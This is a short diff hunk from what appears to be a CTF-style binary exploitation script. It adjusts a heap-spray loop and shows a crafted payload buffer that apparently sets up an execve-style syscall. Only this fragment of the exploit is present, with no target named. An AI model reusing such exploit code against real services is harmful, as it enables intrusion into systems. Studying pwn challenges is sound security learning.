@@ -74,8 +74,8 @@ def exploit(p,e):
     register(p,b"a",b"a")
     login(p,b"a",b"a")
 
-    for i in range(180):
-        create(p,0xff, p8(i))
+    for i in range(170):
+        create(p,0x100, p8(i)) 
 
     data = b"A" * 0x30 + p32(0) + p32(1) + p32(0x3b) + p32(3)
     create(p, 0x3f, data)
